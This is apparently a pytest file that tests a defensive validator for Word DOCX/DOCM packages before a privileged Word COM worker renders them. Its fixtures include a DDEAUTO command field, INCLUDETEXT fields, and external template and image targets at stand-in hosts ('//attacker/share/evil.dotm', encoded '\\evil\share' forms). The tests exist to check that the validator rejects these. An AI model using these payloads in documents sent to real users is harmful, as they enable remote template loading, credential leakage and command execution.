"""Phase C adjudication RED matrix: pre-COM authority and package identity.

These tests pin the invariants that decide which bytes the privileged Word
boundary is allowed to interpret:

* the authoritative main part is the one ``_rels/.rels`` resolves to, not the
  one that happens to be named ``word/document.xml``;
* relationship parsing is namespace-bounded and attribute-unambiguous;
* ``TargetMode`` is a closed enumeration, never normalised toward a permitted
  value;
* the authoritative DOCM bytes reach the local Word worker unmodified.
"""

from __future__ import annotations

from pathlib import Path
from zipfile import ZIP_DEFLATED, ZipFile

import pytest

from scripts.backend_contract import delivery_renderer
from scripts.backend_contract.infrastructure import office_word_worker


_CONTENT_TYPES_NS = "http://schemas.openxmlformats.org/package/2006/content-types"
_TRANSITIONAL_RELS_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
_STRICT_RELS_NS = "http://purl.oclc.org/ooxml/package/relationships"
_OFFICE_DOCUMENT_TYPE = (
    "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
)
_DOCX_MAIN_TYPE = (
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
)
_DOCM_MAIN_TYPE = "application/vnd.ms-word.document.macroEnabled.main+xml"


def _content_types(overrides: dict[str, str], *, defaults: dict[str, str] | None = None) -> str:
    declared = {
        "rels": "application/vnd.openxmlformats-package.relationships+xml",
        "xml": "application/xml",
        **(defaults or {}),
    }
    entries = "".join(
        f'<Default Extension="{extension}" ContentType="{content_type}"/>'
        for extension, content_type in declared.items()
    ) + "".join(
        f'<Override PartName="{part}" ContentType="{content_type}"/>'
        for part, content_type in overrides.items()
    )
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Types xmlns="{_CONTENT_TYPES_NS}">{entries}</Types>'
    )


def _package_rels(target: str, *, namespace: str = _TRANSITIONAL_RELS_NS, extra: str = "") -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Relationships xmlns="{namespace}">'
        f'<Relationship Id="rId1" Type="{_OFFICE_DOCUMENT_TYPE}" Target="{target}"/>'
        f"{extra}</Relationships>"
    )


def _document(body: str = "<w:p><w:r><w:t>Sintetico</w:t></w:r></w:p>") -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        f"<w:body>{body}<w:sectPr/></w:body></w:document>"
    )


_ACQUIRING_BODY = (
    "<w:p><w:r><w:instrText> DDEAUTO Excel System Comando </w:instrText></w:r></w:p>"
)


def _write_package(path: Path, parts: dict[str, str]) -> Path:
    with ZipFile(path, "w", ZIP_DEFLATED) as package:
        for name, value in parts.items():
            package.writestr(name, value)
    return path


def _minimal_docx_parts(main_type: str = _DOCX_MAIN_TYPE) -> dict[str, str]:
    return {
        "[Content_Types].xml": _content_types({"/word/document.xml": main_type}),
        "_rels/.rels": _package_rels("word/document.xml"),
        "word/document.xml": _document(),
    }


# --- F-01: main part authority -------------------------------------------------


def test_relocated_main_part_with_acquiring_field_is_rejected_before_com(tmp_path: Path) -> None:
    """RED F-01: a decoy ``word/document.xml`` must not launder an active main part."""
    source = _write_package(
        tmp_path / "source.docx",
        {
            "[Content_Types].xml": _content_types(
                {
                    "/word/document.xml": _DOCX_MAIN_TYPE,
                    "/main/document.xml": _DOCX_MAIN_TYPE,
                }
            ),
            "_rels/.rels": _package_rels("main/document.xml"),
            "word/document.xml": _document(),
            "main/document.xml": _document(_ACQUIRING_BODY),
        },
    )
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_conventional_main_part_package_is_accepted(tmp_path: Path) -> None:
    """Control for F-01: the supported package shape must keep passing."""
    source = _write_package(tmp_path / "source.docx", _minimal_docx_parts())
    office_word_worker._validate_word_source(source, "DOCX")


def test_missing_package_relationship_part_is_rejected(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    del parts["_rels/.rels"]
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_duplicate_office_document_relationship_is_rejected(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["_rels/.rels"] = _package_rels(
        "word/document.xml",
        extra=(
            f'<Relationship Id="rId2" Type="{_OFFICE_DOCUMENT_TYPE}" '
            'Target="word/document.xml"/>'
        ),
    )
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_absolute_main_part_target_resolves_to_supported_part(tmp_path: Path) -> None:
    """A leading-slash target is the same authoritative part and must be accepted."""
    parts = _minimal_docx_parts()
    parts["_rels/.rels"] = _package_rels("/word/document.xml")
    source = _write_package(tmp_path / "source.docx", parts)
    office_word_worker._validate_word_source(source, "DOCX")


def test_traversal_main_part_target_is_rejected(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["_rels/.rels"] = _package_rels("../word/document.xml")
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


# --- F-06: relationship namespace bounding -------------------------------------


def test_strict_namespace_external_relationship_is_rejected_by_worker(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_STRICT_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://purl.oclc.org/ooxml/officeDocument/'
        'relationships/image" Target="http://synthetic.invalid/x.png" '
        'TargetMode="External"/></Relationships>'
    )
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_unknown_relationship_namespace_fails_closed(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        '<Relationships xmlns="http://synthetic.invalid/relationships">'
        '<Relationship Id="rId9" Type="http://synthetic.invalid/image" '
        'Target="x.png"/></Relationships>'
    )
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_strict_namespace_external_relationship_is_rejected_by_delivery(tmp_path: Path) -> None:
    """RED F-06: ``validate_final_artifact`` iterated relationships namespace-exact."""
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_STRICT_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://purl.oclc.org/ooxml/officeDocument/'
        'relationships/hyperlink" Target="http://synthetic.invalid/x" '
        'TargetMode="External"/></Relationships>'
    )
    content = _write_package(tmp_path / "delivery.docx", parts).read_bytes()
    with pytest.raises(ValueError):
        delivery_renderer.validate_final_artifact(content, "DOCX")


def test_namespaced_duplicate_target_mode_attribute_is_rejected_by_delivery(
    tmp_path: Path,
) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}" xmlns:x="http://synthetic.invalid/x">'
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/hyperlink" Target="http://synthetic.invalid/x" '
        'TargetMode="Internal" x:TargetMode="External"/></Relationships>'
    )
    content = _write_package(tmp_path / "delivery.docx", parts).read_bytes()
    with pytest.raises(ValueError):
        delivery_renderer.validate_final_artifact(content, "DOCX")


# --- F-07: TargetMode closed enumeration ---------------------------------------


@pytest.mark.parametrize(
    "mode",
    [" External", "EXTERNAL ", "Externall", "", "external", "internal", "INTERNAL", " Internal "],
)
def test_noncanonical_target_mode_fails_closed(tmp_path: Path, mode: str) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
        f'2006/relationships/image" Target="synthetic.png" TargetMode="{mode}"/>'
        "</Relationships>"
    )
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_canonical_internal_target_mode_is_accepted(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/image" Target="media/synthetic.png" TargetMode="Internal"/>'
        "</Relationships>"
    )
    parts["word/media/synthetic.png"] = "synthetic"
    parts["[Content_Types].xml"] = _content_types(
        {"/word/document.xml": _DOCX_MAIN_TYPE}, defaults={"png": "image/png"}
    )
    source = _write_package(tmp_path / "source.docx", parts)
    office_word_worker._validate_word_source(source, "DOCX")


def test_undeclared_package_part_fails_closed(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/media/synthetic.png"] = "synthetic"
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


# --- F-08 (pre-COM surface): active content sweep must not rely on part names ---


def test_acquiring_field_outside_word_prefix_is_rejected(tmp_path: Path) -> None:
    """A WordprocessingML part declared by content type must be swept wherever it lives."""
    parts = _minimal_docx_parts()
    parts["[Content_Types].xml"] = _content_types(
        {
            "/word/document.xml": _DOCX_MAIN_TYPE,
            "/extra/header.xml": (
                "application/vnd.openxmlformats-officedocument."
                "wordprocessingml.header+xml"
            ),
        }
    )
    parts["extra/header.xml"] = _document(_ACQUIRING_BODY)
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


# --- F-02: authoritative DOCM bytes reach the worker unmodified ----------------


class _SpyConverter:
    """Captures exactly what the production path hands to the local Word worker."""

    renderer_type = "MICROSOFT_WORD_DESKTOP_COM"

    def __init__(self) -> None:
        self.received: tuple[bytes, str] | None = None

    def convert(self, content: bytes, source_format: str) -> bytes:
        self.received = (content, source_format)
        raise RuntimeError("synthetic stop after capture")


def _docm_bytes(tmp_path: Path) -> bytes:
    parts = _minimal_docx_parts(_DOCM_MAIN_TYPE)
    parts["word/vbaProject.bin"] = "synthetic-vba"
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rId8" Type="http://schemas.microsoft.com/office/2006/'
        'relationships/vbaProject" Target="vbaProject.bin"/></Relationships>'
    )
    parts["[Content_Types].xml"] = _content_types(
        {
            "/word/document.xml": _DOCM_MAIN_TYPE,
            "/word/vbaProject.bin": "application/vnd.ms-office.vbaProject",
        }
    )
    return _write_package(tmp_path / "authoritative.docm", parts).read_bytes()


def test_docm_reaches_converter_as_exact_authoritative_bytes(tmp_path: Path) -> None:
    """RED F-02: the production path rewrote DOCM into a substitute DOCX."""
    authoritative = _docm_bytes(tmp_path)
    spy = _SpyConverter()
    with pytest.raises(ValueError):
        delivery_renderer.render_final_pdf_candidate(
            word_content=authoritative, word_format="DOCM", converter=spy
        )
    assert spy.received is not None
    assert spy.received[1] == "DOCM"
    assert spy.received[0] == authoritative


def test_docx_reaches_converter_as_exact_authoritative_bytes(tmp_path: Path) -> None:
    """Control: the DOCX path was already a pass-through and must stay one."""
    authoritative = _write_package(
        tmp_path / "authoritative.docx", _minimal_docx_parts()
    ).read_bytes()
    spy = _SpyConverter()
    with pytest.raises(ValueError):
        delivery_renderer.render_final_pdf_candidate(
            word_content=authoritative, word_format="DOCX", converter=spy
        )
    assert spy.received is not None
    assert spy.received[1] == "DOCX"
    assert spy.received[0] == authoritative


# --- Phase C §27: OPC part names compare case-insensitively ---


@pytest.mark.parametrize("name", ("word/_rels/settings.xml.RELS", "word/_rels/settings.xml.Rels"))
def test_case_variant_relationship_part_is_still_swept(tmp_path: Path, name: str) -> None:
    """P0: a ".RELS" part is the same part to Word, and bypassed the whole policy."""
    parts = _minimal_docx_parts()
    parts[name] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rIdT" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/attachedTemplate" Target="//attacker/share/evil.dotm" '
        'TargetMode="External"/></Relationships>'
    )
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")

    with pytest.raises(ValueError):
        delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")


def test_part_names_colliding_only_by_case_are_rejected(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/Document.xml"] = _document()
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError, match="duplicate Word package part"):
        office_word_worker._validate_word_source(source, "DOCX")


def test_delivery_rejects_a_local_target_declared_internal(tmp_path: Path) -> None:
    """The delivered artifact must not carry a target that resolves off-box."""
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/image" Target="//evil-host/share/logo.png" '
        'TargetMode="Internal"/></Relationships>'
    )
    content = _write_package(tmp_path / "delivery.docx", parts).read_bytes()
    with pytest.raises(ValueError, match="external relationships"):
        delivery_renderer.validate_final_artifact(content, "DOCX")


def test_zip_directory_entries_do_not_read_as_undeclared(tmp_path: Path) -> None:
    source = tmp_path / "source.docx"
    with ZipFile(source, "w", ZIP_DEFLATED) as package:
        for name, value in _minimal_docx_parts().items():
            package.writestr(name, value)
        package.writestr("word/", "")
    office_word_worker._validate_word_source(source, "DOCX")


# --- Phase C §27 round 2: OPC part-name casing and encoded targets ---


def test_case_variant_content_type_override_still_sweeps_the_part(tmp_path: Path) -> None:
    """P0: an Override differing only in case is the same part to Word."""
    parts = _minimal_docx_parts()
    parts["[Content_Types].xml"] = _content_types(
        {
            "/word/document.xml": _DOCX_MAIN_TYPE,
            "/Parts/Header1.xml": (
                "application/vnd.openxmlformats-officedocument."
                "wordprocessingml.header+xml"
            ),
        }
    )
    parts["parts/header1.xml"] = (
        '<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:p><w:fldSimple w:instr=" INCLUDETEXT x.docx "/></w:p></w:hdr>'
    )
    source = _write_package(tmp_path / "source.docx", parts)

    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


@pytest.mark.parametrize(
    "target",
    (
        "%5C%5Cevil%5Cshare%5Cx.dotm",
        "http%3A%2F%2Fevil%2Fx",
        "%255C%255Cevil%255Cshare",
        "\u200bhttp://evil/x",
    ),
)
def test_encoded_external_target_is_rejected_by_both_validators(
    tmp_path: Path, target: str
) -> None:
    """OPC targets are URI references, so Word decodes them before resolving."""
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
        f'2006/relationships/image" Target="{target}"/></Relationships>'
    )
    source = _write_package(tmp_path / "source.docx", parts)

    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")
    with pytest.raises(ValueError):
        delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")


def test_ordinary_internal_targets_are_still_accepted(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/image" Target="media/logo%20oficial.png"/></Relationships>'
    )
    parts["word/media/logo oficial.png"] = "synthetic"
    parts["[Content_Types].xml"] = _content_types(
        {"/word/document.xml": _DOCX_MAIN_TYPE}, defaults={"png": "image/png"}
    )
    source = _write_package(tmp_path / "source.docx", parts)

    office_word_worker._validate_word_source(source, "DOCX")
